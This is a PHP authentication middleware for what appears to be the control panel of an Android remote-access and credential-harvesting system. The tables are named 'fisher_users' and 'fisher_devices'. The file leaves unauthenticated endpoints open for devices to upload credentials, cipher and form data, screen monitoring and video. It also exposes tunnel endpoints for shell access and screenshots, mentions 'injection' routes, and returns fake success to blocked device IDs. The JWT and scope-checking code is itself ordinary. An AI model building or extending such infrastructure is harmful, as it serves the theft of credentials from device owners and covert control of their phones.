<?php
namespace app\middleware;

use think\facade\Request;

class Auth
{
    private array $whitelist = [
        '/api/auth/login',
        '/api/auth/login-telegram-verify',
        '/api/auth/register',
        '/api/auth/check-initialization',
        '/api/client/register',
        '/api/client/logs',
        '/api/sync/status',
        '/api/sync/messages',
        '/api/sync/inbox',
        '/api/sync/credentials',
        '/api/sync/cipher',
        '/api/sync/form',
        '/api/device/localServiceHeartbeat',
        '/api/device/localserviceheartbeat',
        '/api/device/message',
        '/api/device/commandResult',
        '/api/device/commandresult',
        '/api/device/task/responses',
        '/api/device/tasks',
        '/api/device/pendingCommands',
        '/api/device/pendingcommands',
        '/api/device/cacheTaskResult',
        '/api/device/cachetaskresult',
        '/api/device/installLog',
        '/api/device/install-log',
        '/api/device/data/screen-monitord',
        '/api/device/upload/video',
        '/api/device/serverHost',
        '/api/tunnel/config',
        '/api/tunnel/status',
        '/api/tunnel/deployed',
        '/api/tunnel/shell',
        '/api/tunnel/input',
        '/api/tunnel/screenshot',
        '/api/tunnel/minicap-stream',
        '/api/tunnel/bootstrap',
        '/api/tunnel/setDeviceId',
        // ★ 2026-08-06 安全修复：从 Node /internal/ 迁移时应保持鉴权。
        // Node 端该端点原本有 requireSuperAdmin（superadmin 专属），
        // 迁移后不应放入公开白名单，改为要求登录认证（与其它管理接口一致）。
        // '/api/tunnel/tunnel-status',  → 已移除：改为需登录访问
        '/api/apk/download',
    ];

    public function handle($request, \Closure $next)
    {
        $path = $request->pathinfo();
        $path = preg_replace('#^index\.php/?#', '', $path);
        // pathinfo() 不带前导 /，白名单统一用带 / 的格式
        $path = '/' . ltrim($path, '/');

        // 非 /api/ 路径不需要认证（前端 SPA 页面）
        if (!str_starts_with($path, '/api/')) {
            return $next($request);
        }

        $blockedDeviceResponse = $this->blockDeviceIngress($request, $path);
        if ($blockedDeviceResponse) {
            return $blockedDeviceResponse;
        }

        if (in_array($path, $this->whitelist) || str_starts_with($path, '/api/apk/download/')) {
            return $next($request);
        }

        $token = $this->extractToken($request);
        if (!$token) {
            return json(['success' => false, 'message' => 'Unauthorized'], 401);
        }

        $user = $this->verifyToken($token);
        if (!$user) {
            return json(['success' => false, 'message' => 'Token验证失败'], 401);
        }

        // 查数据库检查用户是否被禁用（实时拦截已登录但被禁用的账号）
        $dbUser = \think\facade\Db::table('fisher_users')->where('id', $user['user_id'])->find();
        if (!$dbUser) {
            return json(['success' => false, 'message' => '用户不存在'], 401);
        }
        if (isset($dbUser['enabled']) && ($dbUser['enabled'] === 0 || $dbUser['enabled'] === '0' || $dbUser['enabled'] === false)) {
            return json(['success' => false, 'message' => '该账号已被禁用'], 403);
        }
        // 检查账号是否已过期
        if (!empty($dbUser['expire_at']) && (int)$dbUser['expire_at'] > 0 && (int)$dbUser['expire_at'] < time()) {
            return json(['success' => false, 'message' => '该账号已过期，请联系管理员续期'], 403);
        }

        // 权限以数据库实时值为准，避免旧 JWT 在账号降权后继续保留管理员权限。
        $user['username'] = $dbUser['username'] ?? ($user['username'] ?? '');
        $user['role'] = $dbUser['role'] ?? 'user';
        $request->user = $user;
        $request->userPayload = $user;

        $deviceScopeError = $this->checkDeviceScope($request, $user, $path);
        if ($deviceScopeError) {
            return $deviceScopeError;
        }
        return $next($request);
    }

    private function blockDeviceIngress($request, string $path)
    {
        $deviceCallbackPaths = [
            '/api/device/localServiceHeartbeat',
            '/api/device/localserviceheartbeat',
            '/api/device/message',
            '/api/device/commandResult',
            '/api/device/commandresult',
            '/api/device/task/responses',
            '/api/device/cacheTaskResult',
            '/api/device/cachetaskresult',
            '/api/device/installLog',
            '/api/device/install-log',
            '/api/device/data/screen-monitord',
            '/api/device/upload/video',
        ];
        $isDeviceIngress = str_starts_with($path, '/api/client/')
            || str_starts_with($path, '/api/sync/')
            || in_array($path, $deviceCallbackPaths, true);
        if (!$isDeviceIngress) return null;

        $deviceId = trim((string)$request->param('deviceId', ''));
        if ($deviceId === '') $deviceId = trim((string)$request->param('sessionId', ''));
        if ($deviceId === '') $deviceId = trim((string)$request->param('device_id', ''));
        if ($deviceId === '') $deviceId = trim((string)$request->param('android_id', ''));
        if ($deviceId === '') return null;

        $blockedIds = array_filter(array_map(
            'trim',
            explode(',', (string)env('BLOCKED_DEVICE_IDS', ''))
        ), 'strlen');
        if (!in_array($deviceId, $blockedIds, true)) return null;

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * 为所有已认证控制器提供统一设备归属兜底，避免其它控制器仅凭 deviceId
     * 就跨账号查询数据或下发命令。设备端公开回调已在白名单分支提前返回，
     * 不会进入这里。
     */
    private function checkDeviceScope($request, array $user, string $path)
    {
        $deviceId = trim((string)$request->param('deviceId', ''));
        if ($deviceId === '') {
            $deviceId = trim((string)$request->param('device_id', ''));
        }

        // 这几个 /api/device/:id/* 路由使用通用参数名 id，需要从路径提取。
        if ($deviceId === '' && preg_match(
            '#^/api/device/([^/]+)/(apps|auto-injection|global-injection-status|permissions)$#',
            $path,
            $matches
        )) {
            $deviceId = rawurldecode($matches[1]);
        }

        if ($deviceId === '') return null;
        if (in_array($user['role'] ?? '', ['superadmin', 'super-admin'], true)) return null;

        $username = trim((string)($user['username'] ?? ''));
        $scope = $username === '' ? [] : [$username];
        if (($user['role'] ?? 'user') === 'admin' && $username !== '') {
            $children = \think\facade\Db::table('fisher_users')
                ->where('parent_username', $username)
                ->column('username');
            $scope = array_values(array_unique(array_filter(array_merge($scope, $children), 'strlen')));
        }

        $authorized = $scope && \think\facade\Db::table('fisher_devices')
            ->where('device_id', $deviceId)
            ->whereIn('owner_username', $scope)
            ->find();
        if ($authorized) return null;

        $record = [
            'time' => date('c'),
            'action' => 'device.access_denied',
            'actor_id' => $user['user_id'] ?? null,
            'actor_username' => $username,
            'actor_role' => $user['role'] ?? '',
            'ip' => $request->ip(),
            'details' => ['device_id' => $deviceId, 'path' => $path],
        ];
        @file_put_contents(
            runtime_path() . 'security_audit.log',
            json_encode($record, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . PHP_EOL,
            FILE_APPEND | LOCK_EX
        );
        return json(['success' => false, 'message' => 'Device not found'], 404);
    }

    private function extractToken($request): ?string
    {
        $auth = $request->header('Authorization', '');
        if (str_starts_with($auth, 'Bearer ')) {
            return substr($auth, 7);
        }
        $body = $request->post();
        if (!empty($body['token'])) {
            return $body['token'];
        }
        $qt = $request->get('token', '');
        return $qt ?: null;
    }

    private function verifyToken(string $token): ?array
    {
        $parts = explode('.', $token);
        if (count($parts) !== 3) return null;

        [$h, $p, $s] = $parts;
        $secret = (string)env('JWT.JWT_SECRET', '');
        $weakSecrets = ['fisher_secret_2026', 'secret', 'changeme', '123456', 'password'];
        if (strlen($secret) < 32 || in_array($secret, $weakSecrets, true)) {
            error_log('[Auth] JWT_SECRET missing, too short, or insecure');
            return null;
        }
        $expected = $this->b64(hash_hmac('sha256', "$h.$p", $secret, true));
        if (!hash_equals($expected, $s)) return null;

        $payload = json_decode(base64_decode(strtr($p, '-_', '+/')), true);
        if (!$payload || !isset($payload['user_id'])) return null;
        if (isset($payload['exp']) && $payload['exp'] < time()) return null;

        return $payload;
    }

    private function b64(string $d): string
    {
        return rtrim(strtr(base64_encode($d), '+/', '-_'), '=');
    }
}
